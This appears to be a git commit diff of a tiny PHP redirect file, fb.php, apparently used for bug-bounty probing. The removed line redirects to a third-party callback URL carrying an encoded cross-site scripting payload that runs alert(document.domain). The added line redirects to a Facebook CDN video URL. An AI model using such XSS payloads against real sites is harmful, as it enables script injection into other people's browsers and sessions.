6f9910c9ab5786e8f4bf9b692568b330d3ea1ff1
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-29 17:17:58 +0100

    Update fb.php

--- fb.php
+++ fb.php
@@ -1,5 +1,5 @@
 <?php
-header('Location: https://api.vhx.tv/?callback=%3C?PXML%3E%3Chtml:script%3Ealert(document.domain)%3C/html:script%3E');
+header('Location: https://video-mrs1-1.xx.fbcdn.net/v/t42.1790-2/23744907_464065987321538_6150537044981448704_n.mp4?_nc_cat=0&efg=eyJ2ZW5jb2RlX3RhZyI6ImRhc2hfdjNfNDI2X2NyZl8yM19tYWluXzMuMF9mcmFnXzJfdmlkZW8ifQ%3D%3D&_nc_eui2=v1%3AAeHe_yBrElF-NJZX3hN5I9ighLq9Ldkp-IlHHPqfTRpgLWx05EJ5iYDHVyqG0Um5m6p5CmBiTJVDHvQc02nuEY1GHdD9O_Qp_HrGaFr3LdCsfw&oh=100ea7c72e057fdbe23f8abf187e8856&oe=5ABD51F8&bytestart=285887&byteend=407659');
 
 ?>
 
